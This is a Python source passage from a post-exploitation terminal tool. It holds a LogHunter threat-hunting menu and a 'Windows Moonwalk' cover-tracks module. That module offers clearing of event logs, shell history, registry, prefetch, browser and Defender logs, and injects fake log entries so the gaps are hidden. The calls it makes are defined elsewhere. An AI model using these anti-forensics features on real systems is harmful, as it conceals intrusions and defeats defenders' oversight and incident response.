            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "Find LogHunter Installation")
            table.add_row("2", "Hunt Credential Access Events")
            table.add_row("3", "Hunt Lateral Movement Indicators")
            table.add_row("4", "Hunt Privilege Escalation Events")
            table.add_row("5", "Custom Query")
            table.add_row("6", "Export Logs")
            table.add_row("?", "Module Guide - Usage instructions and TTPs")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '?'], default='0')
            
            if choice == '0':
                break
            elif choice == '?':
                self._show_guide(console)
            elif choice == '1':
                self._find_loghunter(console)
            elif choice == '2':
                self._hunt_credentials(console)
            elif choice == '3':
                self._hunt_lateral(console)
            elif choice == '4':
                self._hunt_privilege(console)
            elif choice == '5':
                self._custom_query(console)
            elif choice == '6':
                self._export_logs(console)
            
            console.print()
    
    def _show_guide(self, console: Console):
        """Show module guide"""
        guide_text = """[bold cyan]LogHunter Integration Module Guide[/bold cyan]

[bold]Purpose:[/bold]
Hunt through Windows event logs for security events, credential access, and lateral movement indicators.

[bold]Key Functions:[/bold]
1. Find LogHunter Installation - Locate LogHunter tool
2. Hunt Credential Access Events - Find credential dumping activities
3. Hunt Lateral Movement Indicators - Detect lateral movement
4. Hunt Privilege Escalation Events - Find privilege escalation attempts
5. Custom Query - Create custom log queries
6. Export Logs - Export log data for analysis

[bold]MITRE ATT&CK TTPs:[/bold]
• T1055 - Process Injection
• T1003 - OS Credential Dumping
• T1021 - Remote Services
• T1068 - Exploitation for Privilege Escalation
• T1070 - Indicator Removal on Host

[bold]Usage Tips:[/bold]
• Start with option 1 to locate LogHunter
• Use option 2 to find credential access activities
• Option 3 helps detect lateral movement patterns
• Option 5 allows custom queries for specific events
• Option 6 exports logs for offline analysis

[bold]Best Practices:[/bold]
• Review logs regularly for security events
• Export logs for detailed analysis
• Use custom queries for specific threat hunting
• Document findings for incident response"""
        
        console.print(Panel(guide_text, title="Module Guide", border_style="cyan"))
        console.print()
        Prompt.ask("[dim]Press Enter to continue[/dim]", default="")
    
    def _find_loghunter(self, console: Console):
        """Find LogHunter installation"""
        console.print("\n[bold cyan]Finding LogHunter Installation[/bold cyan]\n")
        
        path = self.loghunter.find_loghunter()
        if path:
            console.print(f"[green]LogHunter found:[/green] {path}")
            self.loghunter.loghunter_path = path
        else:
            console.print("[yellow]LogHunter not found[/yellow]")
            console.print("\n[bold]Installation Instructions:[/bold]")
            console.print("  1. Clone repository: git clone https://github.com/CICADA8-Research/LogHunter")
            console.print("  2. Build LogHunter (see repository README)")
            console.print("  3. Place loghunter.exe in PATH or specify path")
    
    def _hunt_credentials(self, console: Console):
        """Hunt for credential access events"""
        console.print("\n[bold cyan]Hunting Credential Access Events[/bold cyan]\n")
        
        try:
            results = self.loghunter.hunt_credential_access()
            
            if results['success']:
                console.print("[green]LogHunter Results:[/green]\n")
                console.print(results['output'])
                console.print(f"\n[green]Events found:[/green] {len(results.get('events', []))}")
            else:
                console.print(f"[red]Error:[/red] {results.get('error', 'Unknown error')}")
        
        except Exception as e:
            console.print(f"[red]Error:[/red] {e}")
    
    def _hunt_lateral(self, console: Console):
        """Hunt for lateral movement indicators"""
        console.print("\n[bold cyan]Hunting Lateral Movement Indicators[/bold cyan]\n")
        
        try:
            results = self.loghunter.hunt_lateral_movement()
            
            if results['success']:
                console.print("[green]LogHunter Results:[/green]\n")
                console.print(results['output'])
                console.print(f"\n[green]Events found:[/green] {len(results.get('events', []))}")
            else:
                console.print(f"[red]Error:[/red] {results.get('error', 'Unknown error')}")
        
        except Exception as e:
            console.print(f"[red]Error:[/red] {e}")
    
    def _hunt_privilege(self, console: Console):
        """Hunt for privilege escalation events"""
        console.print("\n[bold cyan]Hunting Privilege Escalation Events[/bold cyan]\n")
        
        try:
            results = self.loghunter.hunt_privilege_escalation()
            
            if results['success']:
                console.print("[green]LogHunter Results:[/green]\n")
                console.print(results['output'])
                console.print(f"\n[green]Events found:[/green] {len(results.get('events', []))}")
            else:
                console.print(f"[red]Error:[/red] {results.get('error', 'Unknown error')}")
        
        except Exception as e:
            console.print(f"[red]Error:[/red] {e}")
    
    def _custom_query(self, console: Console):
        """Execute custom query"""
        console.print("\n[bold cyan]Custom LogHunter Query[/bold cyan]\n")
        
        query = Prompt.ask("Query", default="EventID=4624")
        
        try:
            results = self.loghunter.hunt_custom_query(query)
            
            if results['success']:
                console.print("[green]Query Results:[/green]\n")
                console.print(results['output'])
            else:
                console.print(f"[red]Error:[/red] {results.get('error', 'Unknown error')}")
        
        except Exception as e:
            console.print(f"[red]Error:[/red] {e}")
    
    def _export_logs(self, console: Console):
        """Export logs"""
        console.print("\n[bold cyan]Export Logs[/bold cyan]\n")
        
        log_type = Prompt.ask("Log type", choices=['Security', 'System', 'Application'], default='Security')
        output_path = Prompt.ask("Output path", default=f"{log_type}_export.evtx")
        
        try:
            success = self.loghunter.export_logs(log_type, output_path)
            if success:
                console.print(f"[green]Log exported:[/green] {output_path}")
            else:
                console.print("[red]Export failed[/red]")
        except Exception as e:
            console.print(f"[red]Error:[/red] {e}")


class MoonwalkModule:
    """Windows Moonwalk Module for TUI"""
    
    def __init__(self):
        self.moonwalk = None
    
    def run(self, console: Console, session_data: dict):
        """Run Moonwalk module"""
        if not self.moonwalk:
            self.moonwalk = WindowsMoonwalk(console, session_data)
        
        while True:
            console.print(Panel(
                "[bold]Windows Moonwalk - Cover Tracks[/bold]\n\n"
                "Clear logs, timestamps, and traces to cover tracks.",
                title="Module 11",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "Clear Event Logs (wevtutil)")
            table.add_row("2", "Clear PowerShell History")
            table.add_row("3", "Clear Command History")
            table.add_row("4", "Clear Registry Traces")
            table.add_row("5", "Clear Prefetch Files")
            table.add_row("6", "Clear Recent Files & Jump Lists")
            table.add_row("7", "Clear Temp Files")
            table.add_row("?", "Module Guide - Usage instructions and TTPs")
            table.add_row("8", "Clear Browser History")
            table.add_row("9", "Clear Windows Defender Logs")
            table.add_row("10", "Clear Windows Artifacts (Thumbnails, WER, etc.)")
            table.add_row("11", "Clear Application Compatibility Cache")
            table.add_row("12", "Full Cleanup (Windows Moonwalk)")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '?'], default='0')
            
            if choice == '0':
                break
            elif choice == '?':
                self._show_guide(console)
            elif choice == '1':
                self._clear_event_logs(console)
            elif choice == '2':
                self._clear_ps_history(console)
            elif choice == '3':
                self._clear_cmd_history(console)
            elif choice == '4':
                self._clear_registry(console)
            elif choice == '5':
                self._clear_prefetch(console)
            elif choice == '6':
                self._clear_recent(console)
            elif choice == '7':
                self._clear_temp(console)
            elif choice == '8':
                self._clear_browser(console)
            elif choice == '9':
                self._clear_defender(console)
            elif choice == '10':
                self._clear_artifacts(console)
            elif choice == '11':
                self._clear_appcompat(console)
            elif choice == '12':
                self._full_cleanup(console)
            
            console.print()
    
    def _show_guide(self, console: Console):
        """Show module guide"""
        guide_text = """[bold cyan]Windows Moonwalk Module Guide[/bold cyan]

[bold]Purpose:[/bold]
Clear logs, timestamps, and traces to cover tracks and avoid detection.

[bold]Key Functions:[/bold]
1. Clear Event Logs - Remove Windows event log entries
2. Clear PowerShell History - Remove PowerShell command history
3. Clear Command History - Remove command prompt history
4. Clear Registry Traces - Remove registry artifacts
5. Clear Prefetch Files - Remove prefetch cache
6. Clear Recent Files - Remove recent files and jump lists
7. Clear Temp Files - Remove temporary files
8. Clear Browser History - Remove browser artifacts
9. Clear Windows Defender Logs - Remove AV logs
10. Clear Windows Artifacts - Remove various Windows artifacts
11. Clear Application Compatibility Cache - Remove AppCompat cache
12. Full Cleanup - Complete moonwalk cleanup

[bold]MITRE ATT&CK TTPs:[/bold]
• T1070 - Indicator Removal on Host
• T1562 - Impair Defenses
• T1070.001 - Clear Windows Event Logs
• T1070.003 - Clear Command History
• T1070.004 - File Deletion

[bold]Usage Tips:[/bold]
• Option 1 clears event logs (most important)
• Option 12 performs full cleanup automatically
• Use after each operation to clear traces
• Moonwalk is automatically enabled in all modules
• Individual options allow selective cleanup

[bold]Best Practices:[/bold]
• Clear traces after each operation
• Use full cleanup (option 12) for comprehensive removal
• Clear event logs regularly during operations
• Remove browser history if accessing web resources
• Document cleanup activities for OPSEC"""
        
        console.print(Panel(guide_text, title="Module Guide", border_style="cyan"))
        console.print()
        Prompt.ask("[dim]Press Enter to continue[/dim]", default="")
    
    def _clear_event_logs(self, console: Console):
        """Clear event logs with fake log injection"""
        console.print("\n[bold cyan]Clear Event Logs[/bold cyan]\n")
        console.print("[dim]Note: Random log entries from other time periods will be injected[/dim]\n")
        
        log_names = Prompt.ask("Log names (comma-separated)", default="Security,System,Application")
        log_list = [log.strip() for log in log_names.split(',')]
        
        inject = Confirm.ask("[bold yellow]Inject fake log entries to avoid blank periods?[/bold yellow]", default=True)
        
        results = self.moonwalk.clear_event_logs(log_list, inject_fake_logs=inject)
        
        console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} logs")
        for log in results['cleared']:
            console.print(f"  • {log}")
        
        if results.get('injected'):
            console.print(f"\n[cyan]Injected fake entries:[/cyan] {len(results['injected'])} logs")
            for log in results['injected']:
                console.print(f"  • {log}")
        
        if results['failed']:
            console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} logs")
            for fail in results['failed']:
                console.print(f"  • {fail['log']}: {fail['error']}")
    
    def _clear_ps_history(self, console: Console):
        """Clear PowerShell history"""
        console.print("\n[bold cyan]Clear PowerShell History[/bold cyan]\n")
        
        success = self.moonwalk.clear_powershell_history()
        if success:
            console.print("[green]PowerShell history cleared[/green]")
        else:
            console.print("[yellow]Some operations may have failed[/yellow]")
    
    def _clear_cmd_history(self, console: Console):
        """Clear command history"""
        console.print("\n[bold cyan]Clear Command History[/bold cyan]\n")
        
        success = self.moonwalk.clear_command_history()
        if success:
            console.print("[green]Command history cleared[/green]")
        else:
            console.print("[yellow]Some operations may have failed[/yellow]")
    
    def _clear_registry(self, console: Console):
        """Clear registry traces"""
        console.print("\n[bold cyan]Clear Registry Traces[/bold cyan]\n")
        
        results = self.moonwalk.clear_registry_traces()
        
        console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} keys")
        for key in results['cleared']:
            console.print(f"  • {key}")
        
        if results['failed']:
            console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} keys")
    
    def _clear_prefetch(self, console: Console):
        """Clear prefetch files"""
        console.print("\n[bold cyan]Clear Prefetch Files[/bold cyan]\n")
        
        if Confirm.ask("[bold yellow]Clear Windows Prefetch files?[/bold yellow]", default=False):
            success = self.moonwalk.clear_prefetch()
            if success:
                console.print("[green]Prefetch files cleared[/green]")
            else:
                console.print("[yellow]Some files may not have been cleared[/yellow]")
    
    def _clear_recent(self, console: Console):
        """Clear recent files"""
        console.print("\n[bold cyan]Clear Recent Files[/bold cyan]\n")
        
        success = self.moonwalk.clear_recent_files()
        if success:
            console.print("[green]Recent files cleared[/green]")
        else:
            console.print("[yellow]Some operations may have failed[/yellow]")
    
    def _clear_temp(self, console: Console):
        """Clear temp files"""
        console.print("\n[bold cyan]Clear Temp Files[/bold cyan]\n")
        
        if Confirm.ask("[bold yellow]Clear temporary files?[/bold yellow]", default=False):
            success = self.moonwalk.clear_temp_files()
            if success:
                console.print("[green]Temp files cleared[/green]")
            else:
                console.print("[yellow]Some files may not have been cleared[/yellow]")
    
    def _clear_browser(self, console: Console):
        """Clear browser history"""
        console.print("\n[bold cyan]Clear Browser History[/bold cyan]\n")
        
        browser = Prompt.ask("Browser", choices=['all', 'chrome', 'edge', 'firefox'], default='all')
        
        results = self.moonwalk.clear_browser_history(browser)
        
        console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} items")
        for item in results['cleared']:
            console.print(f"  • {item}")
    
    def _full_cleanup(self, console: Console):
        """Full cleanup"""
        console.print("\n[bold cyan]Full Cleanup (Moonwalk)[/bold cyan]\n")
        
        if Confirm.ask("[bold yellow]Perform full cleanup? This will clear logs, history, and traces.[/bold yellow]", default=False):
            console.print("\n[yellow]Running full cleanup...[/yellow]\n")
            
            results = self.moonwalk.full_cleanup()
            
            console.print("[green]Cleanup Results:[/green]\n")
            
            if results.get('event_logs', {}).get('cleared'):
                cleared_count = len(results['event_logs']['cleared'])
                injected_count = len(results['event_logs'].get('injected', []))
                console.print(f"Event Logs: {cleared_count} cleared, {injected_count} with fake entries injected")
            
            if results.get('powershell_history'):
                console.print("PowerShell History: Cleared")
            
            if results.get('command_history'):
                console.print("Command History: Cleared")
            
            if results.get('registry_traces', {}).get('cleared'):
                console.print(f"Registry Traces: {len(results['registry_traces']['cleared'])} cleared")
            
            if results.get('prefetch'):
                console.print("Prefetch Files: Cleared")
            
            if results.get('recent_files'):
                console.print("Recent Files: Cleared")
            
            if results.get('temp_files'):
                console.print("Temp Files: Cleared")
            
            if results.get('browser_history', {}).get('cleared'):
                console.print(f"Browser History: {len(results['browser_history']['cleared'])} items cleared")
            
            if results.get('windows_defender', {}).get('cleared'):
                console.print(f"Windows Defender: {len(results['windows_defender']['cleared'])} items cleared")
            
            if results.get('windows_artifacts', {}).get('cleared'):
                console.print(f"Windows Artifacts: {len(results['windows_artifacts']['cleared'])} items cleared")
            
            if results.get('app_compatibility', {}).get('cleared'):
                console.print(f"Application Compatibility Cache: {len(results['app_compatibility']['cleared'])} items cleared")
            
            console.print("\n[green]Full Windows-native cleanup complete[/green]")
    
    def _clear_defender(self, console: Console):
        """Clear Windows Defender logs"""
        console.print("\n[bold cyan]Clear Windows Defender Logs[/bold cyan]\n")
        
        results = self.moonwalk.clear_windows_defender_logs()
        
        console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} items")
        for item in results['cleared']:
            console.print(f"  • {item}")
        
        if results['failed']:
            console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} items")
    
    def _clear_artifacts(self, console: Console):
        """Clear Windows artifacts"""
        console.print("\n[bold cyan]Clear Windows Artifacts[/bold cyan]\n")
        
        results = self.moonwalk.clear_windows_artifacts()
        
        console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} items")
        for item in results['cleared']:
            console.print(f"  • {item}")
        
        if results['failed']:
            console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} items")
    
    def _clear_appcompat(self, console: Console):
        """Clear application compatibility cache"""
        console.print("\n[bold cyan]Clear Application Compatibility Cache[/bold cyan]\n")
        
        if Confirm.ask("[bold yellow]Clear Amcache and SRUM references?[/bold yellow]", default=False):
            results = self.moonwalk.clear_application_compatibility_cache()
            
            console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} items")
            for item in results['cleared']:
                console.print(f"  • {item}")
            
            if results['failed']:
                console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} items")
